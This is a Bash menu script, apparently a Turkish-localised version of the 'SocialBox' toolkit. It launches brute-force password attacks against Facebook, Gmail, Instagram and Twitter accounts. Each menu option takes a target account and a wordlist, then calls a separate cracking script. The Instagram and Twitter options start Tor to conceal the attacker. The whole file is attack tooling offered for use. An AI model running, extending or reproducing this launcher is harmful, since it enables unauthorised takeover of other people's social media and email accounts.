#!/bin/bash
#Colors
white="\033[1;37m"
grey="\033[0;37m"
purple="\033[0;35m"
red="\033[1;31m"
green="\033[1;32m"
yellow="\033[1;33m"
Purple="\033[0;35m"
Cyan="\033[0;36m"
Cafe="\033[0;33m"
Fiuscha="\033[0;35m"
blue="\033[1;34m"
nc="\e[0m"
#ROOT PRIVILEGIES
#if [[ $EUID -ne 0 ]]; then
       echo -e "$red by MyeRs.$nc"
#        exit 1
#fi
#Installation
sleep 1
echo -e "Kurulum Kontrol Ediliyor $nc"
bash install-sb.sh
echo -e "Kontrol tamamlandı [$green✓$nc] $nc "
sleep 1
clear
#Startup
echo -e "$green"
echo "		.▄▄ ·        ▄▄· ▪   ▄▄▄· ▄▄▌      ▄▄▄▄·       ▐▄• ▄ "
echo "		▐█ ▀. ▪     ▐█ ▌▪██ ▐█ ▀█ ██•      ▐█ ▀█▪▪      █▌█▌▪"
echo "		▄▀▀▀█▄ ▄█▀▄ ██ ▄▄▐█·▄█▀▀█ ██▪      ▐█▀▀█▄ ▄█▀▄  ·██· "
echo "		▐█▄▪▐█▐█▌.▐▌▐███▌▐█▌▐█ ▪▐▌▐█▌▐▌    ██▄▪▐█▐█▌.▐▌▪▐█·█▌"
echo -e "		 ▀▀▀▀  ▀█▄▀▪·▀▀▀ ▀▀▀ ▀  ▀ .▀▀▀     ·▀▀▀▀  ▀█▄▀▪•▀▀ ▀▀$nc $blue v1.beta$nc"
#echo -e "	[+]              $red Coded By MyeRs$nc         		   [+]"
#echo -e "	[+] 		 $red www.instagram.com/mrcclk_$nc 		   [+]"
#echo -e "	[+] 		 $red Sosyal Medya Atağı$nc          		   [+]"
#echo -e "	[+]$red Special Greetz To$nc :$green {thelinuxchoice , Ha3MrX, Tunisian Eagles, init__0}$nc [+]"
echo ""
echo -e "$yellow Menüden Seçim Yapın : $nc"
echo ""
echo -e "		$Cyan 1 : Facebook Hesabı Kaba Kuvvet$nc"
echo -e "		$Cyan 2 : Gmail Hesabı Kava Kuvvet$nc"
echo -e "		$Cyan 3 : İnstagram Hesabı Kaba Kuvvet$nc"
echo -e "		$Cyan 4 : Twitter Hesabı Kaba Kuvvet$nc"
echo -e "		$Cyan 99: Çıkış$nc"
read -p "Choice >  " ch
if [ $ch = 1 ]; then
echo -e "			$Cyan Facebook Kaba Kuvvet$nc"
echo -e "$green"
read -p "Gir Facebook ID / Email / Kullanıcı İsmi / Numara: " id
read -p "Wordlist dosya konumu : " wordlist
echo -e "$nc"
cd facebook
perl fb-brute.pl $id $wordlist
echo -e " 		[+]$yellow Kaba Kuvvet Tamamlandı $nc[$green✓$nc] $nc[+]"
echo -e "$red"
read -p "Ana Menüye Geri Dönmek İstiyormusun [ Y / n ] : " check
echo -e "$nc"
if [ $check = "Y" ]; then
cd .. && bash SocialBox.sh
elif [ $check = "y" ]; then
cd .. && bash SocialBox.sh
elif [ $check = "Yes" ]; then
cd .. && bash SocialBox.sh
elif [ $check = "yes" ]; then
cd .. && bash SocialBox.sh
elif [ $check = "YES" ]; then
cd .. && bash SocialBox.sh
else
exit 1
fi
elif [ $ch = 2 ]; then
echo -e "			$Cyan Gmail Kaba Kuvvet$nc"
cd Gemail-Hack
python gemailhack.py
echo -e "               [+]$yellow Kaba Kuvvet Tamamlandı $nc[$green✓$nc] $nc[+]"
echo -e "$red"
read -p "Ana Menüye Geri Dönmek İstiyormusun [ Y / n ] : " check2
echo -e "$nc"
if [ $check2 = "Y" ]; then
cd .. && bash SocialBox.sh
elif [ $check2 = "y" ]; then
cd .. && bash SocialBox.sh
elif [ $check2 = "Yes" ]; then
cd .. && bash SocialBox.sh
elif [ $check2 = "yes" ]; then
cd .. && bash SocialBox.sh
elif [ $check2 = "YES" ]; then
cd .. && bash SocialBox.sh
else
exit 1
fi
elif [ $ch = 3 ]; then
echo -e "			$Cyan Instagram Kaba Kuvvet$nc"
cd instainsane/
sleep 0.025
	echo -e "	[+]$red Tor Servisi Başlatılıyor $nc[+]"
sleep 0.9
service tor start
./instainsane.sh
echo -e "               [+]$yellow Kaba Kuvvet Tamamlandı $nc[$green✓$nc] $nc[+]"
service tor stop
#echo -e "		[+]$red Service Tor Stopped$nc [+]"
echo -e "$red"
read -p "Ana Menüye Geri Dönmek İstiyormusun [ Y / n ] : " check3
echo -e "$nc"
if [ $check3 = "Y" ]; then
cd .. && bash SocialBox.sh
elif [ $check3 = "y" ]; then
cd .. && bash SocialBox.sh
elif [ $check3 = "Yes" ]; then
cd .. && bash SocialBox.sh
elif [ $check3 = "yes" ]; then
cd .. && bash SocialBox.sh
elif [ $check3 = "YES" ]; then
cd .. && bash SocialBox.sh
else
exit 1
fi
elif [ $ch = 4 ]; then
echo -e "			$Cyan Twitter Kaba Kuvvet$nc"
cd tweetshell/
sleep 0.025
        echo -e "	[+]$red Tor Servisi Başlatılıyor $nc[+]"
sleep 0.9
service tor start
bash tweetshell.sh
echo -e "               [+]$yellow Kaba Kuvvet Tamamlandı $nc[$green✓$nc] $nc[+]"
service tor stop
echo -e "		[+]$red Tor Servisi Durduruluyor$nc [+]"
echo -e "$red"
read -p "Ana Menüye Geri Dönmek İstiyormusun [ Y / n ] : " check4
echo -e "$nc"
if [ $check4 = "Y" ]; then
cd .. && bash SocialBox.sh
elif [ $check4 = "y" ]; then
cd .. && bash SocialBox.sh
elif [ $check4 = "Yes" ]; then
cd .. && bash SocialBox.sh
elif [ $check4 = "yes" ]; then
cd .. && bash SocialBox.sh
elif [ $check4 = "YES" ]; then
cd .. && bash SocialBox.sh
else
exit 1
fi
elif [ $ch == 99 ]; then
echo -e "$red Programdan Çıkış Yapılıyor...$nc"
sleep 0.25
exit 1
else
echo "404 Bulunamadı , Çıkış"
exit 1
fi
